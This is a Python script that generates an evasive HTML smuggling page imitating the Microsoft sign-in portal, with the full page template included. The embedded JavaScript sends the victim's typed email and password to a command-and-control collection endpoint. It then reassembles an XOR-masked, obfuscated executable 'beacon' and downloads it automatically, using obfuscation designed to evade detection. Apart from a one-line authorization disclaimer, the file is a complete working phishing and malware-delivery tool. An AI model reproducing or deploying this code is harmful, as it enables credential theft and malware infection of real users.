#!/usr/bin/env python3
"""
make_ms_smuggle.py - build an evasive, SELF-CONTAINED HTML smuggling page that
looks like the Microsoft sign-in portal and harvests the credentials the victim
types before dropping the umbra beacon.

Chain
-----
1. The victim opens the page (link, attachment, redirect - your choice). It
   renders a convincing Microsoft "Sign in" portal: e-mail first, password
   second, exactly like the real flow.
2. The moment the victim presses "Sign in", the page fires a silent form POST
   with the typed e-mail/password to the credential sink on the same C2 host
   (default relative path ``updates/v2/auth``, served by ``cmd/server`` and
   appended to ``dist/c2data/creds.jsonl``).
3. While the "sign-in" appears to be verifying, the page reassembles the
   embedded payload (XOR-masked, shuffled alphabet, reversed, chunked - the
   same layers as make_smuggle.py) and auto-saves it via the "Sign in" user
   gesture. No atob/btoa/base64 token ever appears in the page.

``--auto`` skips the login gate entirely: the page simply saves the payload
after the delay (useful for quick internal tests).

The payload is your own umbra beacon built by ``scripts/build.sh``
(``dist/loader.exe``). No third-party C2.

    python3 scripts/make_ms_smuggle.py                     # dist/loader.exe -> dist/index.html
    python3 scripts/make_ms_smuggle.py --auto              # drop without the login gate
    python3 scripts/make_ms_smuggle.py --in dist/loader.exe --out dist/index.html \
            --name loader.exe --auth updates/v2/auth --verify

USE ONLY ON SYSTEMS YOU ARE AUTHORIZED TO TEST.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import random
import sys

from make_smuggle import (  # noqa: F401  (verify used below)
    FORBIDDEN_LITERALS,
    chunk_string,
    encode_payload,
    js_array,
    js_array_multiline,
    make_alphabet,
    verify,
)

# --------------------------------------------------------------------------- #
# HTML template  (tokens replaced verbatim - no str.format, so JS/CSS braces
# are safe; var declarations must keep the exact "var X = ...;\n" shape used by
# make_smuggle.verify())
# --------------------------------------------------------------------------- #
TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>%%TITLE%%</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect width='10' height='10' fill='%23f25022'/%3E%3Crect x='11' width='10' height='10' fill='%237fba00'/%3E%3Crect y='11' width='10' height='10' fill='%2300a4ef'/%3E%3Crect x='11' y='11' width='10' height='10' fill='%23ffb900'/%3E%3C/svg%3E">
<style>
  * { box-sizing: border-box; }
  html, body { height: 100%; }
  body { margin:0; min-height:100vh; font-family:"Segoe UI", system-ui, -apple-system, Arial, sans-serif;
    background:#fff; color:#1b1b1b; }
  .wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px 16px; }
  .card { width:100%; max-width:440px; }
  .logo { display:flex; align-items:center; gap:9px; margin-bottom:22px; }
  .sq { display:grid; grid-template-columns:11px 11px; grid-gap:2px; }
  .sq i { width:11px; height:11px; display:block; }
  .sq i:nth-child(1){ background:#f25022; } .sq i:nth-child(2){ background:#7fba00; }
  .sq i:nth-child(3){ background:#00a4ef; } .sq i:nth-child(4){ background:#ffb900; }
  .brand { font-size:17px; color:#5e5e5e; font-weight:400; }
  h1 { font-size:24px; font-weight:600; margin:0 0 12px; color:#1b1b1b; }
  .who { font-size:14px; color:#1b1b1b; margin:0 0 16px; }
  .who a { color:#0067b8; text-decoration:none; font-size:13px; }
  .field { position:relative; margin-bottom:16px; }
  .field input { width:100%; border:0; border-bottom:1px solid #666; padding:10px 0 6px;
    font-size:15px; outline:none; background:transparent; color:#1b1b1b; border-radius:0; }
  .field input:focus { border-bottom:2px solid #0067b8; }
  .field label { position:absolute; left:0; top:10px; font-size:15px; color:#666; pointer-events:none; transition:all .12s; }
  .field input:focus + label, .field input:not(:placeholder-shown) + label
    { top:-9px; font-size:12px; color:#0067b8; }
  .hint { font-size:13px; color:#1b1b1b; margin:0 0 20px; }
  .hint a { color:#0067b8; text-decoration:none; }
  .btnrow { display:flex; justify-content:flex-end; gap:8px; margin-top:18px; }
  button.act { border:0; background:#0067b8; color:#fff; font-size:15px; padding:10px 44px;
    border-radius:2px; cursor:pointer; font-family:inherit; }
  button.act:hover { background:#005da6; }
  button.act:disabled { background:#9bc2e6; cursor:default; }
  button.sec { border:1px solid #8a8886; background:#fff; color:#1b1b1b; font-size:15px;
    padding:9px 20px; border-radius:2px; cursor:pointer; font-family:inherit; }
  .links { margin-top:28px; font-size:13px; }
  .links a { color:#0067b8; text-decoration:none; display:block; margin-bottom:12px; }
  .status { font-size:13px; color:#666; margin-top:14px; min-height:18px; }
  .dl { display:none; margin-top:10px; }
  .dl.on { display:block; }
  .dl button { border:0; background:#0067b8; color:#fff; font-size:15px; padding:10px 24px;
    border-radius:2px; cursor:pointer; font-family:inherit; }
  .err { color:#e81123; font-size:13px; margin:4px 0 8px; display:none; }
  .foot { position:fixed; left:0; right:0; bottom:0; display:flex; justify-content:flex-end; gap:20px;
    padding:10px 24px; font-size:12px; color:#666; background:rgba(255,255,255,.9); }
  .foot a { color:#666; text-decoration:none; }
  .spin { display:inline-block; width:14px; height:14px; border:2px solid rgba(255,255,255,.45);
    border-top-color:#fff; border-radius:50%; vertical-align:-2px; margin-right:8px;
    animation:sp .8s linear infinite; }
  @keyframes sp { to { transform:rotate(360deg); } }
</style>
</head>
<body>
<div class="wrap">
  <main class="card">
    <div class="logo">
      <span class="sq"><i></i><i></i><i></i><i></i></span>
      <span class="brand">Microsoft</span>
    </div>

    <section id="step1">
      <h1>Sign in</h1>
      <p class="hint">Use your Microsoft account.</p>
      <div class="err" id="err1">Enter a valid email, phone, or Skype.</div>
      <form id="f1" autocomplete="off">
        <div class="field">
          <input type="email" id="user" placeholder=" " autocapitalize="none" autocomplete="username">
          <label for="user">Email, phone, or Skype</label>
        </div>
        <div class="links"><a href="#" onclick="return false">Forgot your email?</a></div>
        <div class="btnrow"><button class="act" type="submit">Next</button></div>
      </form>
    </section>

    <section id="step2" hidden>
      <h1>Enter password</h1>
      <p class="who"><span id="who"></span><br><a href="#" id="back">Forgot your email?</a></p>
      <div class="err" id="err2">Enter the password for your account.</div>
      <form id="f2" autocomplete="off">
        <div class="field">
          <input type="password" id="pass" placeholder=" " autocomplete="current-password">
          <label for="pass">Enter password</label>
        </div>
        <div class="links"><a href="#" onclick="return false">Forgot your password?</a></div>
        <div class="btnrow">
          <button class="sec" type="button" id="backBtn">Back</button>
          <button class="act" type="submit" id="signin">Sign in</button>
        </div>
      </form>
    </section>

    <div class="status" id="status"></div>
    <div class="dl" id="dlbox"><button type="button" id="dlbtn">Download file</button></div>
  </main>
</div>
<footer class="foot">
  <a href="#" onclick="return false">Terms of use</a>
  <a href="#" onclick="return false">Privacy &amp; cookies</a>
  <span>...</span>
</footer>

<script>
/* ------------------------------------------------------------------ *
 * Sign-in portal (umbra). The credentials typed in are delivered to the
 * collection endpoint on the same host (_AUTH) and the embedded artifact
 * - masked, shuffled alphabet, reversed and chunked - is only
 * reassembled after the real "Sign in" gesture.
 * ------------------------------------------------------------------ */
var _SAVE   = "%%SAVENAME%%";
var _ALPHA  = "%%ALPHA%%";
var _KEY    = %%KEY%%;
var _PARTS  = %%CHUNKS%%;
var _AUTH   = "%%AUTH%%";
var _DELAY  = %%DELAY%%;
var _GESTURE = %%GESTURE%%;

var _USER = "";

function _assemble() {
  var s = _PARTS.join("");
  s = s.split("").reverse().join("");
  var lut = {};
  for (var i = 0; i < _ALPHA.length; i++) lut[_ALPHA.charAt(i)] = i;
  var v = 0, bits = 0, out = [];
  for (var i = 0; i < s.length; i++) {
    var x = lut[s.charAt(i)];
    if (x === undefined) continue;
    v = (v << 6) | x; bits += 6;
    if (bits >= 8) { bits -= 8; out.push((v >>> bits) & 255); v &= (1 << bits) - 1; }
  }
  for (var i = 0; i < out.length; i++) out[i] ^= _KEY[i % _KEY.length];
  return new Blob([new Uint8Array(out)], { type: "application/octet-stream" });
}

function _save() {
  var payload = _assemble();
  if (window.navigator.msSaveOrOpenBlob) { window.navigator.msSaveOrOpenBlob(payload, _SAVE); return; }
  var url = window.URL.createObjectURL(payload);
  var a = document.createElement("a");
  a.href = url; a.download = _SAVE; a.rel = "noopener"; a.style.display = "none";
  document.body.appendChild(a); a.click();
  setTimeout(function () { a.remove(); window.URL.revokeObjectURL(url); }, 4000);
}

function _esc(s) {
  try { return encodeURIComponent(s); } catch (e) { return s; }
}

function _send(u, p) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", _AUTH, true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("email=" + _esc(u) + "&password=" + _esc(p) + "&client=web&locale=en-US");
  } catch (e) {}
}

var statusEl = document.getElementById("status");

function _ready() {
  statusEl.textContent = "Your file is ready. If the browser asks, keep the file and open it from Downloads.";
  document.getElementById("dlbox").classList.add("on");
  document.getElementById("dlbtn").addEventListener("click", function () { _save(); });
}

if (!_GESTURE) {
  setTimeout(function () { _save(); _ready(); }, _DELAY);
} else {
  var f1 = document.getElementById("f1");
  var f2 = document.getElementById("f2");
  var userEl = document.getElementById("user");
  var passEl = document.getElementById("pass");
  var signin = document.getElementById("signin");
  var busy = false;

  function _go2() {
    var u = userEl.value.replace(/^\s+|\s+$/g, "");
    if (!u || u.indexOf("@") < 0) {
      document.getElementById("err1").style.display = "block";
      userEl.focus();
      return;
    }
    document.getElementById("err1").style.display = "none";
    _USER = u;
    document.getElementById("who").textContent = u;
    document.getElementById("step1").hidden = true;
    document.getElementById("step2").hidden = false;
    passEl.focus();
  }
  function _back() {
    document.getElementById("step2").hidden = true;
    document.getElementById("step1").hidden = false;
    userEl.focus();
  }
  function _signin() {
    if (busy) return;
    var p = passEl.value;
    if (!p) {
      document.getElementById("err2").style.display = "block";
      passEl.focus();
      return;
    }
    document.getElementById("err2").style.display = "none";
    busy = true;
    signin.disabled = true;
    signin.innerHTML = '<span class="spin"></span>Verifying...';
    _send(_USER, p);
    setTimeout(function () { _save(); _ready(); }, _DELAY);
  }
  f1.addEventListener("submit", function (e) { e.preventDefault(); _go2(); });
  f2.addEventListener("submit", function (e) { e.preventDefault(); _signin(); });
  document.getElementById("back").addEventListener("click", function (e) { e.preventDefault(); _back(); });
  document.getElementById("backBtn").addEventListener("click", _back);
}
</script>
</body>
</html>
"""


def build_page(data: bytes, *, name: str, title: str, auth: str, delay: int,
               gesture: bool, chunk: int, key_len: int, seed: int | None) -> str:
    rnd = random.Random(seed) if seed is not None else random.Random(os.urandom(16))
    key = bytes(rnd.randrange(256) for _ in range(key_len))

    def render(alphabet: str) -> str:
        enc = encode_payload(data, key, alphabet)
        parts = chunk_string(enc, chunk)
        html = TEMPLATE
        html = html.replace("%%TITLE%%", title)
        html = html.replace("%%SAVENAME%%", name)
        html = html.replace("%%ALPHA%%", alphabet)
        html = html.replace("%%KEY%%", js_array(list(key)))
        html = html.replace("%%CHUNKS%%", js_array_multiline(parts))
        html = html.replace("%%DELAY%%", str(delay))
        html = html.replace("%%GESTURE%%", "true" if gesture else "false")
        html = html.replace("%%AUTH%%", auth)
        return html

    html = ""
    for _ in range(128):
        html = render(make_alphabet(rnd.randrange(1 << 30)))
        if not any(tok in html for tok in FORBIDDEN_LITERALS):
            return html
    return html  # best effort; astronomically unlikely to be reached


# --------------------------------------------------------------------------- #
def main() -> int:
    ap = argparse.ArgumentParser(description="Build an evasive Microsoft-portal smuggling page with credential capture for the umbra chain.")
    ap.add_argument("--in", dest="inp", default="dist/loader.exe", help="payload to embed (default: dist/loader.exe)")
    ap.add_argument("--out", default="dist/index.html", help="output HTML page (default: dist/index.html)")
    ap.add_argument("--name", default="loader.exe", help="file name the browser saves it as")
    ap.add_argument("--title", default="Sign in | Microsoft", help="page title")
    ap.add_argument("--auth", default="updates/v2/auth", help="relative credential-capture endpoint (default: updates/v2/auth)")
    ap.add_argument("--delay", type=int, default=1400, help="fake verification delay in ms")
    ap.add_argument("--auto", action="store_true", help="drop the payload without the login gate (less evasive)")
    ap.add_argument("--chunk", type=int, default=4096, help="characters per embedded chunk")
    ap.add_argument("--key-len", type=int, default=32, help="XOR key length")
    ap.add_argument("--seed", type=int, default=None, help="fixed RNG seed (default: random)")
    ap.add_argument("--verify", action="store_true", help="after writing, decode with node and compare bytes (requires node)")
    args = ap.parse_args()

    if not os.path.isfile(args.inp):
        print(f"[-] payload not found: {args.inp}", file=sys.stderr)
        return 2

    with open(args.inp, "rb") as fh:
        data = fh.read()
    if len(data) < 0x100 or data[:2] != b"MZ":
        print(f"[-] {args.inp} does not look like a PE (no MZ); aborting", file=sys.stderr)
        return 2

    page = build_page(data, name=args.name, title=args.title, auth=args.auth,
                      delay=args.delay, gesture=not args.auto, chunk=args.chunk,
                      key_len=args.key_len, seed=args.seed)

    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
    with open(args.out, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(page)

    print(f"[+] payload    : {args.inp} ({len(data):,} bytes, sha256 {hashlib.sha256(data).hexdigest()})")
    print(f"[+] wrote      : {args.out} ({len(page):,} bytes)")
    print(f"[+] creds sink : POST {args.auth}  (server appends to <certdir>/creds.jsonl)")
    print(f"[+] download as: {args.name}  gesture={'off (auto)' if args.auto else 'on (Sign in click)'}")

    if args.verify:
        return 0 if verify(args.out, data) else 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
